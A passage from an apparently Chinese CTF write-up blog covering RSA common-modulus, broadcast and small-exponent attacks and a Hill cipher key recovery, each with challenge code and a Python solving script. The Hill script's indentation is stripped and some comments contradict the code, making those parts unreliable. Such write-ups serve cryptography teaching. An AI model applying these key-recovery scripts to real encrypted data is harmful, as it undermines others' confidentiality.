flag<br>m=bytes_to_long(flag)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keygen</span>():<br>    e1=<span class="hljs-number">2</span>*getPrime(<span class="hljs-number">15</span>)<br>    e2=<span class="hljs-number">4</span>*getPrime(<span class="hljs-number">15</span>)<br>    p=getPrime(<span class="hljs-number">1024</span>)<br>    q=getPrime(<span class="hljs-number">1024</span>)<br>    n=p*q<br>    <span class="hljs-keyword">return</span> (e1,e2,n)<br>e1,e2,n=keygen()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e1=&#x27;</span>,e1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e2=&#x27;</span>,e2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br>c1=<span class="hljs-built_in">pow</span>(m,e1,n)<br>c2=<span class="hljs-built_in">pow</span>(m,e2,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c1=&#x27;</span>,c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c2=&#x27;</span>,c2)<br><span class="hljs-comment"># e1= 49246</span><br><span class="hljs-comment"># e2= 94876</span><br><span class="hljs-comment"># n= 15422996159451904852473174028898253584913377676363819980538989914803115756916186235491810479476811263936381551809909976937968980882126192606966562720114341059441455456939020506047451678157729526538718335734547923960326553636002476314480564046124249903037721365804544921151536994939930580163383394088409505343769145331117966696916131510020790899148408237925404083350526115378517065718581913006523409036764127414221071175778130826476357897059285353637807894925240593356476945961351511401042371681464634354729826321125741031143348803480712056744777808734462693761433589051517185323218969590549849953524466211707122563941</span><br><span class="hljs-comment"># c1= 6147891604969691994272938463718926960563301208432543325486775757491804869317911480869338609596150258981253533850682974045224378926022596532503146484077212638654180553501081634826296331824088815843423105159524841563939525439673018292238685572932582747558339267670553775182874306471313781808651574203539279555241058866794571995588469482046621873496403907400094102625981779848738166495051278675924289102764233026001676370171213549990930121572023718496201797295708136328392431377386284461285591856103798479940141154666285990500617738760132347234756221756340024935750204821200845760576105015474067550080339835399163100040</span><br><span class="hljs-comment"># c2= 3093030297945974503381749337872565195581935130889584051762119282374564896341881578910830476149964614830286287898367345725273787376230642089098704221347795275565944870395151392798932118222014215404581082695565421278488452631760981687146367171930725647899226778342793785085183793863903671225216334614070179243157450517467266519550642244456102899115332256978449140904673600113124302736745241533380070375085717083469792272023098757797440161998538606254369174513800980882373169554239307931519183843199573817716851758311482806598030648271713642499000705794033482737770640133273260055487200790791569639011401563979410493187</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>v假设m是明文，两用户的公钥分别是e1和e2，且gcd(e1,e2)=g，共同的模数N，两个密文分别为：</p><script type="math/tex; mode=display">c_1≡m^{e_1} (mod N)</script><script type="math/tex; mode=display">c_2≡m^{e_2}(mod N)</script><p>攻击者知道N，e1，e2，c1和c2，可如下恢复明文m</p><p>§(e1,e2)=1，由欧几里德算法可找出r,s满足re1＋se2＝g。假定r是负数，那么</p><script type="math/tex; mode=display">(𝒄_𝟏^{−𝟏})^{−𝒓}∙𝒄_𝟐^𝒔=𝒎^{𝒓𝒆𝟏＋𝒔𝒆𝟐}≡𝒎^g(𝒎𝒐𝒅 𝑵)</script><p>最后对m^g开g次方就行</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,long_to_bytes<br> <br>e1 = <span class="hljs-number">49246</span><br>e2 = <span class="hljs-number">94876</span><br>n = <span class="hljs-number">15422996159451904852473174028898253584913377676363819980538989914803115756916186235491810479476811263936381551809909976937968980882126192606966562720114341059441455456939020506047451678157729526538718335734547923960326553636002476314480564046124249903037721365804544921151536994939930580163383394088409505343769145331117966696916131510020790899148408237925404083350526115378517065718581913006523409036764127414221071175778130826476357897059285353637807894925240593356476945961351511401042371681464634354729826321125741031143348803480712056744777808734462693761433589051517185323218969590549849953524466211707122563941</span><br> <br>c1 = <span class="hljs-number">6147891604969691994272938463718926960563301208432543325486775757491804869317911480869338609596150258981253533850682974045224378926022596532503146484077212638654180553501081634826296331824088815843423105159524841563939525439673018292238685572932582747558339267670553775182874306471313781808651574203539279555241058866794571995588469482046621873496403907400094102625981779848738166495051278675924289102764233026001676370171213549990930121572023718496201797295708136328392431377386284461285591856103798479940141154666285990500617738760132347234756221756340024935750204821200845760576105015474067550080339835399163100040</span><br>c2 = <span class="hljs-number">3093030297945974503381749337872565195581935130889584051762119282374564896341881578910830476149964614830286287898367345725273787376230642089098704221347795275565944870395151392798932118222014215404581082695565421278488452631760981687146367171930725647899226778342793785085183793863903671225216334614070179243157450517467266519550642244456102899115332256978449140904673600113124302736745241533380070375085717083469792272023098757797440161998538606254369174513800980882373169554239307931519183843199573817716851758311482806598030648271713642499000705794033482737770640133273260055487200790791569639011401563979410493187</span><br><br>_,s1, s2 = gmpy2.gcdext(e1, e2)<br>m = <span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n) % n<br>m=gmpy2.iroot(m,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="6-Broadcast-Attack"><a href="#6-Broadcast-Attack" class="headerlink" title="6.Broadcast Attack"></a>6.Broadcast Attack</h2><p>描述：广播攻击</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br>m=bytes_to_long(flag)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keygen</span>():<br>    p=getPrime(<span class="hljs-number">512</span>)<br>    q=getPrime(<span class="hljs-number">512</span>)<br>    n=p*q<br>    <span class="hljs-keyword">return</span>  n<br>e=<span class="hljs-number">7</span><br>all_n=[]<br>all_c=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    n=(i+<span class="hljs-number">1</span>)*keygen()<br>    c=<span class="hljs-built_in">pow</span>(m,e,n)<br>    all_n.append(n)<br>    all_c.append(c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,all_n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,all_c)<br><span class="hljs-comment">#n= [80344152384919167990029263889754960948209845791211184381440216725305480722214355317554846921769548699022818176746527813447832852986356827894460089359906958298413852032738079245182086423589521394919505428403599787966095525006378159646229522780050159648730761727549270911309005711228144649098555723669252608533, 206711056161541185610998841945410057546046962305566631150699157908810508704448370290187882607590345058121084559828281980280804250614697673373550505117295230647642694893444121123913820446578565526937863682395027124899950447369977680321465023687130175852203997527248176949419167677816147358627121426813634094106, 334937934765494365545874961082796707301320021757105920109935273568442731468801865940925619303931384872289422910905953965831652550716387142755770207545054180754423734601307392486912147442586780808371411313697126325575569010055726042632661013222299656268713573799894267479907197765979607479378468083775803748559, 411308800371340574686063462612551006547003469268333738036697605873424622825484342377990141479696248858940763852388180443997767377302291365905372543519272204571465181708434999210612236510149154882433046246439318514893810234580027400403039870266240190325444184350120579737956908412002252092787242562254043202092]</span><br><span class="hljs-comment">#c= [17955398309315563979087357299431645997993944995440693359389858483765569640372825530709456431478582392832456249664268775515309414328150692281653622592006970114589702319099744659218099384362405096303844129998439060918631595548825126937211469186076279514878214301481963145340365370306823949120065353389406080936, 153505528713310581847212034107989610364294267182645279748318527967444222631008873578079680972067518689023467784976022011463290654221742742721543010776769459843775659118318074689116762244388113413088812663124504401071265250780970773530547659084903771347030011444361061145037693196631515301986938150832555441205, 38989289078469737951588573613576358671236832411781851201470120934371588033775742458909965667883448099812335887752021209739114322499041815386487668411430270253036202998509379146857603350968259481148530984569488672755996062893760479880294179415131965736336322795017048264335184982632230654411517828348378588413, 316778873023749063920472495470694822892202553032640570017374726053581395791301141201914886538532296398855962114186792003902783911423227538798192376709559279493989612169685107891947232931659235991503877065374862619497187890144379979552670081517110166095532001135172014012635785297597924843065341089363116841005]</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>低指数广播攻击</p><p>如果3个用户都使用e(e=7)作为公钥，对同一个明文m加密，则c1＝m^e (mod n1)，c2＝m^e (mod n2)，c3＝m^e (mod n3)， gcd⁡(n1,n2,n3)=1 ，且m＜n1，m＜n2，m＜n3</p><p>由中国剩余定理可从c1，c2，c3计算出c，且c＝m^e mod (n1n2n3 )，显然m^e＜n1n2n3，所以m＝c^(1/e)</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><br>e = <span class="hljs-number">7</span><br>n= [<span class="hljs-number">80344152384919167990029263889754960948209845791211184381440216725305480722214355317554846921769548699022818176746527813447832852986356827894460089359906958298413852032738079245182086423589521394919505428403599787966095525006378159646229522780050159648730761727549270911309005711228144649098555723669252608533</span>, <span class="hljs-number">206711056161541185610998841945410057546046962305566631150699157908810508704448370290187882607590345058121084559828281980280804250614697673373550505117295230647642694893444121123913820446578565526937863682395027124899950447369977680321465023687130175852203997527248176949419167677816147358627121426813634094106</span>, <span class="hljs-number">334937934765494365545874961082796707301320021757105920109935273568442731468801865940925619303931384872289422910905953965831652550716387142755770207545054180754423734601307392486912147442586780808371411313697126325575569010055726042632661013222299656268713573799894267479907197765979607479378468083775803748559</span>, <span class="hljs-number">411308800371340574686063462612551006547003469268333738036697605873424622825484342377990141479696248858940763852388180443997767377302291365905372543519272204571465181708434999210612236510149154882433046246439318514893810234580027400403039870266240190325444184350120579737956908412002252092787242562254043202092</span>]<br><br>c= [<span class="hljs-number">17955398309315563979087357299431645997993944995440693359389858483765569640372825530709456431478582392832456249664268775515309414328150692281653622592006970114589702319099744659218099384362405096303844129998439060918631595548825126937211469186076279514878214301481963145340365370306823949120065353389406080936</span>, <span class="hljs-number">153505528713310581847212034107989610364294267182645279748318527967444222631008873578079680972067518689023467784976022011463290654221742742721543010776769459843775659118318074689116762244388113413088812663124504401071265250780970773530547659084903771347030011444361061145037693196631515301986938150832555441205</span>, <span class="hljs-number">38989289078469737951588573613576358671236832411781851201470120934371588033775742458909965667883448099812335887752021209739114322499041815386487668411430270253036202998509379146857603350968259481148530984569488672755996062893760479880294179415131965736336322795017048264335184982632230654411517828348378588413</span>, <span class="hljs-number">316778873023749063920472495470694822892202553032640570017374726053581395791301141201914886538532296398855962114186792003902783911423227538798192376709559279493989612169685107891947232931659235991503877065374862619497187890144379979552670081517110166095532001135172014012635785297597924843065341089363116841005</span>]<br><br>resultant, mod = crt(n, c)<br>value, is_perfect = gmpy2.iroot(resultant, e)<br><span class="hljs-built_in">print</span>(long_to_bytes(value))<br></code></pre></td></tr></table></figure><h2 id="7-Small-Key"><a href="#7-Small-Key" class="headerlink" title="7.Small Key"></a>7.Small Key</h2><p>描述：小公钥~</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)==<span class="hljs-number">42</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">s:<span class="hljs-built_in">bytes</span>,size</span>):<br>    ans=s.decode()+<span class="hljs-string">&#x27;!&#x27;</span>*(size-<span class="hljs-built_in">len</span>(s))<br>    <span class="hljs-keyword">return</span> ans.encode()<br>m1=bytes_to_long(flag[:<span class="hljs-number">22</span>])<br>m2=bytes_to_long(pad(flag[<span class="hljs-number">22</span>:],<span class="hljs-number">22</span>))<br>e=<span class="hljs-number">3</span><br>p,q=getPrime(<span class="hljs-number">256</span>),getPrime(<span class="hljs-number">256</span>)<br>n=p*q<br>c1=<span class="hljs-built_in">pow</span>(m1,e,n)<br>c2=<span class="hljs-built_in">pow</span>(m2,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c1=&#x27;</span>,c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c2=&#x27;</span>,c2)<br><span class="hljs-comment"># n= 6967832237204330196563924410215769351012429755963036614404646944578757616592379184755587797727812672196681269416377943762912499498173115762935897596518389</span><br><span class="hljs-comment"># c1= 2706960373217607239898677340053424887286602125975860101980692729200775954722261115343260130419870695592398436708960109960779567621546348948271400897465668</span><br><span class="hljs-comment"># c2= 3608485667119105048003928492033357574628492501458693506051473273811947850615038413084623838364823008979919239514104931931531310680884729536536519965463417</span><br><br></code></pre></td></tr></table></figure><p>思路：</p><p>公钥小明显可用低指数攻击</p><p>基于拓展欧几里得，密文m的三次方能表示成m^3 = c + n<em>k，遍历k,直到 c + n\</em>k能被e开3次</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">de</span>(<span class="hljs-params">c, e, n</span>):<br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        m = c + n*k<br>        result, flag = gmpy2.iroot(m, e)<br>        <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == flag:<br>            <span class="hljs-keyword">return</span> result<br>        k += <span class="hljs-number">1</span><br>e= <span class="hljs-number">3</span><br>n= <span class="hljs-number">6967832237204330196563924410215769351012429755963036614404646944578757616592379184755587797727812672196681269416377943762912499498173115762935897596518389</span><br>c= <span class="hljs-number">2706960373217607239898677340053424887286602125975860101980692729200775954722261115343260130419870695592398436708960109960779567621546348948271400897465668</span><br>c2=<span class="hljs-number">3608485667119105048003928492033357574628492501458693506051473273811947850615038413084623838364823008979919239514104931931531310680884729536536519965463417</span><br>m=de(c,e,n)<br>m2=de(c2,e,n)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-built_in">print</span>(long_to_bytes(m2))<br></code></pre></td></tr></table></figure><h2 id="8-Hill"><a href="#8-Hill" class="headerlink" title="8.Hill"></a>8.Hill</h2><p>描述：mod 127，让加密有更多选择</p><p>提示：联系密码学设计的hill，将模数转为127，且flag的格式为flag{，相当与已知密文和明文; )</p><p>题目：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Hill</span> and mod is <span class="hljs-number">127</span><br><br><span class="hljs-attribute">enc</span>=[<span class="hljs-number">98</span>, <span class="hljs-number">86</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">88</span>, <span class="hljs-number">7</span>, <span class="hljs-number">70</span>, <span class="hljs-number">66</span>, <span class="hljs-number">88</span>, <span class="hljs-number">90</span>, <span class="hljs-number">59</span>, <span class="hljs-number">75</span>, <span class="hljs-number">45</span>, <span class="hljs-number">51</span>, <span class="hljs-number">10</span>, <span class="hljs-number">110</span>, <span class="hljs-number">64</span>, <span class="hljs-number">68</span>, <span class="hljs-number">12</span>, <span class="hljs-number">125</span>, <span class="hljs-number">23</span>, <span class="hljs-number">54</span>, <span class="hljs-number">45</span>, <span class="hljs-number">51</span>, <span class="hljs-number">119</span>, <span class="hljs-number">86</span>, <span class="hljs-number">116</span>, <span class="hljs-number">104</span>, <span class="hljs-number">96</span>, <span class="hljs-number">109</span>, <span class="hljs-number">14</span>, <span class="hljs-number">106</span>, <span class="hljs-number">118</span>, <span class="hljs-number">85</span>, <span class="hljs-number">112</span>, <span class="hljs-number">108</span>, <span class="hljs-number">32</span>, <span class="hljs-number">30</span>, <span class="hljs-number">39</span>, <span class="hljs-number">53</span>, <span class="hljs-number">47</span>, <span class="hljs-number">22</span>]<br></code></pre></td></tr></table></figure><p>思路：已知明文前5个是flag{,相当于已知5对明密文，Hill的密钥破解需要m^2个明密文对(m为模数)，所以m只能是2，密钥才有可能解出来。在已知明密文和模数的情况下通过对明文矩阵求逆左乘密文矩阵就能得到密钥。</p><script type="math/tex; mode=display">p*k=c</script><script type="math/tex; mode=display">k=p^{-1}*c</script><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>Letters=<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">strToArr</span>(<span class="hljs-params">string</span>):<br><span class="hljs-comment">#字符串转成数组</span><br>numList=[]<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> string:<br>numList.append(<span class="hljs-built_in">ord</span>(s))<br><br>Array=np.array(numList)<br><br><span class="hljs-keyword">return</span> Array<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ListToStr</span>(<span class="hljs-params"><span class="hljs-type">List</span></span>):<br><span class="hljs-comment">#列表数子为字符</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-type">List</span>:<br>result=result+<span class="hljs-built_in">chr</span>(i)<br><br><span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul_mod_inv</span>(<span class="hljs-params">x</span>):<br><span class="hljs-comment"># 在模26下求一个数x的乘法逆元y，只需要满足(x×y) mod 26 = 1</span><br><span class="hljs-comment"># y的取值范围为[0,26)</span><br>x=<span class="hljs-built_in">round</span>(x%<span class="hljs-number">127</span>,<span class="hljs-number">0</span>)<br>y = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span>(y &lt; <span class="hljs-number">127</span>):<br>res = (x * y) % <span class="hljs-number">127</span><br><span class="hljs-keyword">if</span> res == <span class="hljs-number">1</span>:<br><span class="hljs-keyword">return</span> y<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>y = y + <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> y == <span class="hljs-number">127</span>:<br><span class="hljs-built_in">print</span>(x,<span class="hljs-string">&quot;在模127下，不存在乘法逆元!&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">message,m,key</span>):<br><span class="hljs-comment">#Hill加密</span><br>result=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">#储存加密后的字符串</span><br>m_arr=np.array(message)<br><span class="hljs-comment">#m_arr=strToArr(message)    #将明文变成int型一维数组</span><br><span class="hljs-comment">#print(m_arr)</span><br>m_arr=m_arr.reshape(-<span class="hljs-number">1</span>,m)  <span class="hljs-comment">#将数组变成m列的向量</span><br><span class="hljs-comment">#print(m_arr)</span><br>c_arr=(np.matmul(m_arr,key))%<span class="hljs-number">127</span>   <span class="hljs-comment">#加密</span><br><br>c_arr=c_arr.reshape(-<span class="hljs-number">1</span>)  <span class="hljs-comment">#将结果变为一维数组 </span><br>c_arr=np.around(c_arr)<br>c_arr=c_arr.astype(<span class="hljs-built_in">int</span>)<br>c_list=c_arr.tolist()    <br><span class="hljs-comment">#print(c_list)</span><br>result=ListToStr(c_list)  <span class="hljs-comment">#将列表中的数字转成对应字母</span><br><br><span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_inv</span>(<span class="hljs-params">key</span>):<br><span class="hljs-comment">#整数域上求矩阵逆元</span><br>k_1=np.linalg.inv(key) <span class="hljs-comment"># 求key的逆矩阵，但由于其不是整数，故通过行列式的乘法逆元乘上伴随矩阵得到整数逆元</span><br>k_det=np.linalg.det(key) <span class="hljs-comment">#求key矩阵的行列式</span><br>k_det_inv=mul_mod_inv(k_det) <span class="hljs-comment">#求行列式模26的乘法逆元 本质上是1/|A|</span><br>k_2=k_1*k_det%<span class="hljs-number">127</span>  <span class="hljs-comment">#矩阵的逆乘行列式=伴随矩阵</span><br>k_2=np.around(k_2) <br>k_2=k_2.astype(np.int64)<span class="hljs-comment">#浮点型转int型</span><br>k_3=k_det_inv*k_2%<span class="hljs-number">127</span> <span class="hljs-comment">#行列式的乘法逆元乘上伴随矩阵得到整数逆元</span><br>k_3=np.around(k_3)  <span class="hljs-comment"># 由于伴随矩阵得到的可能是浮点数矩阵，故需要对其进行四舍五入取整</span><br>k_3=k_3.astype(np.int64)  <span class="hljs-comment"># 并将每个元素成员强制转换为int类型</span><br><br><span class="hljs-keyword">return</span> k_3<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">c,m,key</span>):<br>k_3=matrix_inv(key)<span class="hljs-comment">#行列式的乘法逆元乘上伴随矩阵得到整数逆元</span><br><span class="hljs-keyword">return</span> encrypt(c,m,k_3) <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hackKey</span>(<span class="hljs-params">p,c,m</span>):<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p)&lt;m*m:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;数据过少不可爆破密钥&#x27;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>p_arr=strToArr(p[:m*m])<br><span class="hljs-comment">#print(p_arr)</span><br>p_arr=p_arr.reshape(-<span class="hljs-number">1</span>,m)<br>c_arr=strToArr(c[<span class="hljs-number">0</span>:m*m])<br>c_arr=c_arr.reshape(-<span class="hljs-number">1</span>,m)<br>p_inv=matrix_inv(p_arr)<br>key_arr=(np.matmul(p_inv,c_arr))%<span class="hljs-number">127</span><br><span class="hljs-keyword">return</span> key_arr<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>p=<span class="hljs-string">&#x27;flag&#x27;</span><br>c=[<span class="hljs-number">98</span>, <span class="hljs-number">86</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>]<br>cc=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>cc+=<span class="hljs-built_in">chr</span>(c[i])<br>m=<span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;明文:&quot;</span>+p+<span class="hljs-string">&quot; 与密文: &quot;</span>+cc+<span class="hljs-string">&quot; 加密密钥为：&quot;</span>)<br>hac=hackKey(p,cc,m)<br><span class="hljs-built_in">print</span>(hac)<br>message=[<span class="hljs-number">98</span>, <span class="hljs-number">86</span>, <span class="hljs-number">15</span>, <span class="hljs-number">3</span>, <span class="hljs-number">88</span>, <span class="hljs-number">7</span>, <span class="hljs-number">70</span>, <span class="hljs-number">66</span>, <span class="hljs-number">88</span>, <span class="hljs-number">90</span>, <span class="hljs-number">59</span>, <span class="hljs-number">75</span>, <span class="hljs-number">45</span>, <span class="hljs-number">51</span>, <span class="hljs-number">10</span>, <span class="hljs-number">110</span>, <span class="hljs-number">64</span>, <span class="hljs-number">68</span>, <span class="hljs-number">12</span>, <span class="hljs-number">125</span>, <span class="hljs-number">23</span>, <span class="hljs-number">54</span>, <span class="hljs-number">45</span>, <span class="hljs-number">51</span>, <span class="hljs-number">119</span>, <span class="hljs-number">86</span>, <span class="hljs-number">116</span>, <span class="hljs-number">104</span>, <span class="hljs-number">96</span>, <span class="hljs-number">109</span>, <span class="hljs-number">14</span>, <span class="hljs-number">106</span>, <span class="hljs-number">118</span>, <span class="hljs-number">85</span>, <span class="hljs-number">112</span>, <span class="hljs-number">108</span>, <span class="hljs-number">32</span>, <span class="hljs-number">30</span>, <span class="hljs-number">39</span>, <span class="hljs-number">53</span>, <span class="hljs-number">47</span>, <span class="hljs-number">22</span>]<br>res=<span class="hljs-string">&#x27;&#x27;</span><br>key=np.array([[<span class="hljs-number">20</span> ,<span class="hljs-number">22</span>],<br> [<span class="hljs-number">22</span> ,<span class="hljs-number">20</span>]],dtype=<span class="hljs-built_in">int</span>)<br>m=<span class="hljs-number">2</span><br>de=decrypt(message,m,key)<br><span class="hljs-built_in">print</span>(de)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br><br></code></pre></td></tr></table></figure><h2 id="9-AES-CBC"><a href="#9-AES-CBC" class="headerlink" title="9.AES CBC"></a>9.AES CBC</h2><p>描述：AES CBC 碰撞</p><p>提示：Crypto中的CBC模式在加密一次后iv会修改为加密的密文用于下一轮加密。</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 